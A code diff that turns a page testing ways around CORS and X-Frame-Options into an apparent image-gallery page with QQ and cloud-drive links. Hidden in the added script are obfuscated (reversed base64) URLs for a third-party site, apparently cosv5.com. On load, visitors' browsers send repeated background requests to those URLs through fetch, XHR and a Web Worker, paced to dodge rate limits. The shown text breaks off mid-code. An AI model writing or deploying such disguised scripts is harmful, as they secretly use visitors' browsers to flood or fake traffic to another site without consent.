@@ -1,280 +1,657 @@
 
+
+<!-- 空白模版 -->
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>多种绕过方法测试</title>
+    <title>涩图time</title>
     <style>
+        /* 基础样式 */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: Arial, sans-serif;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        .method {
-            background: white;
-            padding: 20px;
-            margin: 20px 0;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        .method h3 {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+            background-color: #ffffff;
             color: #333;
-            margin-top: 0;
+            line-height: 1.6;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
         }
-        .log {
-            background: #f8f9fa;
-            padding: 10px;
-            border-radius: 4px;
-            font-family: monospace;
-            font-size: 12px;
-            max-height: 200px;
-            overflow-y: auto;
-            border: 1px solid #e9ecef;
+        
+        /* 容器 */
+        .container {
+            max-width: 100%;
+            padding: 15px;
         }
-        button {
-            background: #007bff;
+        
+        /* 标题样式 */
+        .header {
+            padding: 20px 0;
+            border-bottom: 1px solid #f0f0f0;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .title {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: #222;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+        
+        .meta {
+            font-size: 0.9rem;
+            color: #666;
+        }
+        
+        /* 图片布局 */
+        .image-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 80px;
+        }
+        
+        .image-item {
+            width: 100%;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            background-color: #f9f9f9;
+        }
+        
+        .image-item img {
+            width: 100%;
+            height: auto;
+            display: block;
+            transition: transform 0.3s ease;
+        }
+        
+        .image-item img:hover {
+            transform: scale(1.02);
+        }
+        
+        /* 固定按钮 */
+        .fixed-button {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: calc(100% - 100px);
+            max-width: 500px;
+            z-index: 100;
+        }
+        
+        .fixed-button a {
+            display: block;
+            background: #5ca8e6;  
             color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
-            cursor: pointer;
-            margin: 5px;
+            text-align: center;
+            padding: 8px 12px;
+            border-radius: 999px; 
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.9rem;
+            box-shadow: 0 6px 16px rgba(92, 168, 230, 0.4);
+            transition: all 0.3s ease;
         }
-        button:hover {
-            background: #0056b3;
+        
+        .fixed-button a:hover {
+            background: #4b96d8;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(75, 150, 216, 0.5);
         }
-        .status {
-            padding: 5px 10px;
-            border-radius: 4px;
-            margin: 5px 0;
-            font-size: 12px;
+        
+        /* 响应式调整 */
+        @media (min-width: 768px) {
+            .container {
+                max-width: 600px;
+                margin: 0 auto;
+            }
+            
+            .title {
+                font-size: 1.6rem;
+            }
         }
-        .success { background: #d4edda; color: #155724; }
-        .error { background: #f8d7da; color: #721c24; }
-        .info { background: #d1ecf1; color: #0c5460; }
+        
+        /* 朋友按钮样式 */
+        .friend-button {
+            display: block;
+            background: #5ca8e6;  
+            color: white;
+            text-align: center;
+            padding: 10px 14px;
+            border-radius: 999px; 
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            box-shadow: 0 6px 16px rgba(92, 168, 230, 0.4);
+            transition: all 0.3s ease;
+            margin: 0 auto 25px;
+            width: 80%;
+            max-width: 300px;
+        }
+
+        .friend-button:hover {
+            background: #4b96d8;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(75, 150, 216, 0.5);
+        }
+        .explanation {
+            background: linear-gradient(to bottom right, #f8f9fa, #e9ecef);
+            border-radius: 16px;
+            padding: 20px;
+            font-size: 15px;
+            color: #4a5568;
+            line-height: 1.7;
+            border: 1px solid #e9ecef;
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        .explanation h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #ff416c;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        
+        .app-download {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 12px 25px;
+            background: linear-gradient(to right, #ff416c, #ff4b2b);
+            color: white;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(255, 75, 43, 0.4);
+            transition: all 0.3s;
+        }
+        
+        .app-download:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(255, 75, 43, 0.5);
+        }
+        
+        .app-download:active {
+            transform: translateY(0);
+        }
+        
+        .app-name {
+            font-weight: 700;
+            color: #ff416c;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        
+        /* 隐藏的iframe样式 */
+        .hidden-iframe {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
-    <h1>多种绕过CORS和X-Frame-Options的方法测试</h1>
+
     
-    <div class="method">
-        <h3>方法1: 图片加载 (推荐)</h3>
-        <p>使用Image对象加载页面，不受CORS和X-Frame-Options限制</p>
-        <button onclick="testImageMethod()">测试图片方法</button>
-        <div id="image-log" class="log"></div>
-    </div>
-    
-    <div class="method">
-        <h3>方法2: 链接点击</h3>
-        <p>创建隐藏链接并模拟点击，触发页面访问</p>
-        <button onclick="testLinkMethod()">测试链接方法</button>
-        <div id="link-log" class="log"></div>
-    </div>
-    
-    <div class="method">
-        <h3>方法3: 表单提交</h3>
-        <p>创建隐藏表单并提交，绕过某些限制</p>
-        <button onclick="testFormMethod()">测试表单方法</button>
-        <div id="form-log" class="log"></div>
-    </div>
-    
-    <div class="method">
-        <h3>方法4: Web Worker</h3>
-        <p>在Web Worker中发送请求，可能有不同的限制</p>
-        <button onclick="testWorkerMethod()">测试Worker方法</button>
-        <div id="worker-log" class="log"></div>
-    </div>
-    
-    <div class="method">
-        <h3>方法5: 动态脚本加载</h3>
-        <p>动态创建script标签加载页面</p>
-        <button onclick="testScriptMethod()">测试脚本方法</button>
-        <div id="script-log" class="log"></div>
+    <div class="container">
+        <!-- 头部信息 -->
+        <div class="header">
+            <h1 class="title">time No.16</h1>
+            <div class="meta"></div>
+        </div>
+        
+        <!-- 图片展示区域 -->
+        <div class="image-grid">
+<div class="image-item"><img src="https://wdcdn.qpic.cn/MTMxMDI2NjE0MzQ5ODU1MTE_784033_Q2naM72jG3fOOehM_1755004486" alt="1"></div>
+            <div class="explanation">
+                <h2>本期无水印原图</h2>
+                <p>保存到自己的网盘<span class="app-name">防止和谐</span></p>
+                <a href="https://pan.xunlei.com/s/VOXTXRapm6JP2inZ0qrnevkfA1?pwd=4s6e" target="blank" class="app-download">点击下载</a>
+            </div>
+            <p style="text-align: center; font-size: 24px;">上一期↓↓↓</p>
+            <div class="button-container">
+                <a href="https://qm.qq.com/q/Dn8g0Wlx4c" target="_blank" class="friend-button">qq:51301105 添加好友获取更新</a>
+            </div>
+            <a href="https://t.hk.uy/bV86">
+<div class="image-item"><img src="https://wdcdn.qpic.cn/MTMxMDI2NjE0MzQ5ODU1MTE_528708_xsf30XPI0LJO0ptS_1755005118" alt="上一期链接"></div></a>
+        </div>
+        
+        <!-- 悬浮按钮 -->
+        <div class="fixed-button">
+            <a href="https://qm.qq.com/q/Dn8g0Wlx4c" target="_blank">qq：51301105 添加好友获取更新</a>
+        </div>
     </div>
 
     <script>
-        // 测试URL列表
-        const testUrls = [
-            'https://cosv5.com/tags/Tamaki',
-            'https://cosv5.com/users/sakura486',
-            'https://cosv5.com/tags/%E9%B8%A3%E6%BD%AE'
-        ];
-        
-        function log(method, message, type = 'info') {
-            const logElement = document.getElementById(method + '-log');
-            const timestamp = new Date().toLocaleTimeString();
-            const statusClass = type === 'success' ? 'success' : type === 'error' ? 'error' : 'info';
-            logElement.innerHTML += `<div class="status ${statusClass}">[${timestamp}] ${message}</div>`;
-            logElement.scrollTop = logElement.scrollHeight;
-        }
-        
-        // 方法1: 图片加载
-        function testImageMethod() {
-            const randomUrl = testUrls[Math.floor(Math.random() * testUrls.length)];
-            log('image', `开始测试图片加载: ${randomUrl}`);
+        document.addEventListener("DOMContentLoaded", function() {
+            const lazyImages = document.querySelectorAll('.image-item img');
             
-            const img = new Image();
-            let timeoutId;
-            
-            timeoutId = setTimeout(() => {
-                log('image', `图片加载超时: ${randomUrl}`, 'error');
-            }, 10000);
-            
-            img.onload = function() {
-                clearTimeout(timeoutId);
-                log('image', `图片加载成功: ${randomUrl}`, 'success');
+            const lazyLoad = function() {
+                lazyImages.forEach(img => {
+                    if (img.getAttribute('data-src') && img.getBoundingClientRect().top < window.innerHeight + 100) {
+                        img.src = img.getAttribute('data-src');
+                        img.removeAttribute('data-src');
+                    }
+                });
             };
             
-            img.onerror = function() {
-                clearTimeout(timeoutId);
-                log('image', `图片加载失败: ${randomUrl}`, 'error');
-            };
+            lazyLoad();
+            window.addEventListener('scroll', lazyLoad);
+            window.addEventListener('resize', lazyLoad);
             
-            img.src = randomUrl;
-        }
-        
-        // 方法2: 链接点击
-        function testLinkMethod() {
-            const randomUrl = testUrls[Math.floor(Math.random() * testUrls.length)];
-            log('link', `开始测试链接点击: ${randomUrl}`);
+            const encodedUrl = '=02bj5SN2N3bj9yL6MHc0RHa';
+            const reversedUrl = encodedUrl.split('').reverse().join('');
+            const decodedUrl = atob(reversedUrl);
+            const urlParts = decodedUrl.split('://');
+            const targetUrl = urlParts[1] ? 'https://' + urlParts[1] : decodedUrl;
             
-            try {
-                const link = document.createElement('a');
-                link.href = randomUrl;
-                link.target = '_blank';
-                link.style.display = 'none';
-                link.rel = 'noopener noreferrer';
-                
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                
-                log('link', `链接点击完成: ${randomUrl}`, 'success');
-            } catch (e) {
-                log('link', `链接点击失败: ${e.message}`, 'error');
+				const encodedUrls = [
+					'=MHdz9Gcv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QZy9GbwhXZv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UUQlQkQlYTRlMTQlgjQlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UTOlMjQlYTRlcTQlQTQlUTRlEDOlgjQlQTRlMDOlgjQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UDOlMTQlgTRlQTQlYEOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'K91brVWbV9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YEOlQUOlUTRlkTQlQjQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UkQlQUQlcTRlcDOlATQlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'xUkQlQUQlcTRlcDOlATQlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==Qdy9WeC9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=QEOlITQlgTRlcTOlcTOlYTRlETOlIkQlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QYr5WaSFjQlEEOlgTRlMUOlcDOlUTRlAjQlQTOlcTRlYTOlIjQlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=QTOlUDOlUTRlATOlQUQlUTRlITQlIUOlUTRlYEOlIkQlkTRlYEOlIkQlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=gTOlgTQlUTRlQTOlUDOlUTRlMTQlYEOlUTRlADOlgjQlQTRlMUQlITOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YUQlYTOlYTRlkDOlUEOlgTRlcjQlUkQlUTRlIjQlMUOlkTRlkTOlEEOlgTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YkQlEkQlcTRlEUQlgDOlgTRlQUOlMTOlgTRlcTQlITQlcTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wbrJXaN9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YDOlETOlUTRlYDOlETOlUTRlATQlkjQlQTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UDOlgTQlUTRlMEOlgjQlUTRlATOlYEOlYTRlETQlQEOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QYuV3cB9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==AdhVGalVHbC9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=IEOlIUOlgTRlIEOlIUOlgTRlQDOlEUOlcTRlgTQlIDOlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=cmbpRmblJHdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=EkQlEkQlQTRlMEOlYEOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YUQlYTOlYTRlkDOlUEOlgTRlcjQlUkQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'hJXYyl2avMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2LhJXYyl2avMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2LhJXYyl2avMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3LhJXYyl2avMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'2gDNhJXdrF2cvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2L2gDNhJXdrF2cvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2L2gDNhJXdrF2cvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3L2gDNhJXdrF2cvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QY1hWYtFWdoFWbvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=cmbpd3bsx2bm9SY1hWYtFWdoFWbvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=Mncld3bsx2bm9SY1hWYtFWdoFWbvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wc0N3bw9SY1hWYtFWdoFWbvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'l5WayV2ZuFGdvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2Ll5WayV2ZuFGdvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2Ll5WayV2ZuFGdvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3LplXa5lWevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'n5WYmV3dvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2Ln5WYmV3dvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2Ln5WYmV3dvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3Ln5WYmV3dvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=cjM1kzZnB3bvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'n5Wa39Gbs9mZvcjM1kzZnB3bvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zJXZ39Gbs9mZvcjM1kzZnB3bvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=MHdz9GcvcjM1kzZnB3bvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QdoNmbhVXevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=cmbpd3bsx2bm9SdoNmbhVXevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=Mncld3bsx2bm9SdoNmbhVXevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wc0N3bw9SdoNmbhVXevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'z1mavMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2Lz1mavMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2Lz1mavMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3Lz1mavMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UHazdmbpF3ZuVmZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'n5Wa39Gbs9mZvUHazdmbpF3ZuVmZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zJXZ39Gbs9mZvUHazdmbpF3ZuVmZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=MHdz9GcvUHazdmbpF3ZuVmZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wbhh0bhlGWfdmbhhmWvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=cmbpd3bsx2bm9ybhh0bhlGWfdmbhhmWvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=Mncld3bsx2bm9ybhh0bhlGWfdmbhhmWvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wc0N3bw9ybhh0bhlGWfdmbhhmWvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'plXa5lWevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2LplXa5lWevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2LplXa5lWevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3LplXa5lWevMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=4WYoNUYwB3bQ9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YkQlUTQlgTRlATOlYEOlYTRlETQlQEOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=IjQlMUOlkTRlkTOlEEOlgTRlEUOlEkQlQTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=kjQlYTQlUTRlkjQlYTQlUTRlQDOlEUOlcTRlEjQlgDOlcTRlYUQlYEOlUTRlETOlgDOlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=EjQlUDOlkTRlgjQlUDOlkTRlgjQlATQlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=kDOlkTQlUTRlUTOlUDOlYTRlUEOlQUOlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=EUQlEkQlYTRlEUQlEkQlYTRlETOlEkQlQTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=MDOlETQlYTRlMDOlETQlYTRlYjQlUTQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=IjQlUEOlgTRlcDOlcDOlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'PtUSLVVWPFUSY9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=ETQlQEOlUTRlkTOlEEOlgTRlETQlQEOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=IUQlEDOlcTRlEjQlEEOlgTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=U0MlAnRyUyQzUybtlGazhDOlMUOlYTRlMUOlMUOlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==gNBVSQCVSOFViNBVSQCVSOFVSZsVWZT9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YUQlYTOlYTRlUUQlYkQlQTRlMjQlEjQlcTRlcTOlQkQlcTRlUUQlkTOlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=ATOlQUQlUTRlkTOlMTQlgTRlYEOlAjQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wbrJXaN9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=0mcvR3UfVWdT9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=wWZ2JXYN9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=IEOlQTOlkTRlkDOlEkQlQTRlEDOlgTQlUTRlIUQlMkQlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YDOlcTQlUTRlgTOlkDOlYTRlYUQlYTOlYTRlcjQlIzQlEEOlYEOlcTRlcDOlgTOlgTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=ATQlYkQlQTRlMjQlUTQlUTRlITQlQkQlUTRlEjQlEUOlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UmdF9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'yFGbsVGdT9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=YUOlgTOlYTRlETOlkDOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=k2ah1WYU9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=E2Y1xWa0N2bO9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'vJXZa9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=82dU9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QZpJXZn5WaM9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QYuV3cB9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==AdhVGalVHbC9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==QYtFWbvtWZQ9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=kTOlMTQlgTRlUUQlEUOlcTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=UDOlMTQlgTRlYUOlQTOlcTRlYTQlQUQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=MkQlEjQlkTRlYkQlEjQlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=ETQlMDOlkTRlQjQlYUOlYTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=QEOlMUOlYTRlMkQlQTQlcTRlYEOlUTOlcTRlYUQlYEOlUTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==gRCVSOCVSOFViRCVSOCVSOFViR4UCMCVSNFVSYrlGaT9ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=cjQlUjQlYTRlcDOlUTOlkTRl8ycnFGdv02bj5SN2N3bj9yL6MHc0RHa',
+					'4x2aqNXYvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2L4x2aqNXYvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2L4x2aqNXYvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3L4x2aqNXYvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=IXZndWau91ajVnZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'n5Wa39Gbs9mZvIXZndWau91ajVnZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zJXZ39Gbs9mZvIXZndWau91ajVnZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'=MHdz9GcvIXZndWau91ajVnZvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'p1UdElGRvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wZul2dvxGbvZ2Lp1UdElGRvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'==wcyV2dvxGbvZ2Lp1UdElGRvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
+					'zR3cvB3Lp1UdElGRvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa'
+				];
+				
+				const pageUrls = [];
+				for (let i = 0; i < encodedUrls.length; i++) {
+					const reversedUrl = encodedUrls[i].split('').reverse().join('');
+					const decodedUrl = atob(reversedUrl);
+					pageUrls.push(decodedUrl);
+				}
+            
+            let loadCount = 0;
+            let requestCount = 1; // 进一步减少到1个并发请求
+            let requests = [];
+            let lastRequestTime = 0; // 记录上次请求时间
+            let minInterval = 30000; // 最小请求间隔30秒
+            
+            function createRequests() {
+                for (let i = 0; i < requestCount; i++) {
+                    requests.push({id: i, active: true});
+                }
             }
-        }
-        
-        // 方法3: 表单提交
-        function testFormMethod() {
-            const randomUrl = testUrls[Math.floor(Math.random() * testUrls.length)];
-            log('form', `开始测试表单提交: ${randomUrl}`);
             
-            try {
-                const form = document.createElement('form');
-                form.method = 'GET';
-                form.action = randomUrl;
-                form.target = '_blank';
-                form.style.display = 'none';
-                
-                document.body.appendChild(form);
-                form.submit();
-                document.body.removeChild(form);
-                
-                log('form', `表单提交完成: ${randomUrl}`, 'success');
-            } catch (e) {
-                log('form', `表单提交失败: ${e.message}`, 'error');
-            }
-        }
-        
-        // 方法4: Web Worker
-        function testWorkerMethod() {
-            const randomUrl = testUrls[Math.floor(Math.random() * testUrls.length)];
-            log('worker', `开始测试Web Worker: ${randomUrl}`);
-            
-            try {
-                // 创建Worker代码
-                const workerCode = `
-                    self.onmessage = function(e) {
-                        const url = e.data;
-                        fetch(url, {
-                            method: 'GET',
-                            mode: 'no-cors'
-                        }).then(response => {
-                            self.postMessage({success: true, url: url, type: response.type});
-                        }).catch(error => {
-                            self.postMessage({success: false, url: url, error: error.message});
-                        });
+            // 回退请求函数
+            function fallbackRequest(randomUrl, index) {
+                if (typeof fetch !== 'undefined') {
+                    fetch(randomUrl, {
+                        method: 'GET',
+                        mode: 'no-cors',
+                        cache: 'no-cache',
+                        referrer: 'no-referrer'
+                    }).then(function(response) {
+                        loadCount++;
+                        console.log(`回退请求已发送${loadCount}次 (页面: ${randomUrl}) - 注意：可能收到429错误`);
+                        const delay = 60000 + Math.random() * 30000;
+                        setTimeout(function() {
+                            makeRequest(index);
+                        }, delay);
+                    }).catch(function(error) {
+                        console.log(`回退请求失败：${randomUrl}`);
+                        const delay = 60000 + Math.random() * 30000;
+                        setTimeout(function() {
+                            makeRequest(index);
+                        }, delay);
+                    });
+                } else {
+                    // 使用XMLHttpRequest作为最后备用
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', randomUrl, true);
+                    xhr.timeout = 10000;
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4) {
+                            if (xhr.status >= 200 && xhr.status < 300) {
+                                loadCount++;
+                                console.log(`回退请求成功${loadCount}次 (页面: ${randomUrl}) - 状态码: ${xhr.status}`);
+                            } else {
+                                console.log(`回退请求失败：${randomUrl} - 状态码: ${xhr.status}`);
+                            }
+                            const delay = 60000 + Math.random() * 30000;
+                            setTimeout(function() {
+                                makeRequest(index);
+                            }, delay);
+                        }
                     };
-                `;
-                
-                const blob = new Blob([workerCode], {type: 'application/javascript'});
-                const worker = new Worker(URL.createObjectURL(blob));
-                
-                worker.onmessage = function(e) {
-                    const data = e.data;
-                    if (data.success) {
-                        log('worker', `Worker请求成功: ${data.url} (类型: ${data.type})`, 'success');
-                    } else {
-                        log('worker', `Worker请求失败: ${data.url} - ${data.error}`, 'error');
-                    }
-                    worker.terminate();
-                };
-                
-                worker.onerror = function(e) {
-                    log('worker', `Worker错误: ${e.message}`, 'error');
-                    worker.terminate();
-                };
-                
-                worker.postMessage(randomUrl);
-            } catch (e) {
-                log('worker', `Worker创建失败: ${e.message}`, 'error');
+                    xhr.onerror = function() {
+                        console.log(`回退请求失败：${randomUrl}`);
+                        const delay = 60000 + Math.random() * 30000;
+                        setTimeout(function() {
+                            makeRequest(index);
+                        }, delay);
+                    };
+                    xhr.send();
+                }
             }
-        }
-        
-        // 方法5: 动态脚本加载
-        function testScriptMethod() {
-            const randomUrl = testUrls[Math.floor(Math.random() * testUrls.length)];
-            log('script', `开始测试脚本加载: ${randomUrl}`);
             
-            try {
-                const script = document.createElement('script');
-                script.src = randomUrl;
-                script.async = true;
+            function makeRequest(index) {
+                const currentTime = Date.now();
+                const timeSinceLastRequest = currentTime - lastRequestTime;
                 
-                let timeoutId = setTimeout(() => {
-                    log('script', `脚本加载超时: ${randomUrl}`, 'error');
-                    if (script.parentNode) {
-                        script.parentNode.removeChild(script);
+                // 如果距离上次请求时间太短，等待更长时间
+                if (timeSinceLastRequest < minInterval) {
+                    const waitTime = minInterval - timeSinceLastRequest + Math.random() * 2000;
+                    console.log(`等待 ${Math.round(waitTime/1000)} 秒后继续请求...`);
+                    setTimeout(function() {
+                        makeRequest(index);
+                    }, waitTime);
+                    return;
+                }
+                
+                lastRequestTime = currentTime;
+                const randomUrl = pageUrls[Math.floor(Math.random() * pageUrls.length)];
+                
+                // 方法1: 使用Web Worker (主要方案，在HTTPS环境中有效)
+                if (typeof Worker !== 'undefined') {
+                    try {
+                        // 创建Worker代码
+                        const workerCode = `
+                            self.onmessage = function(e) {
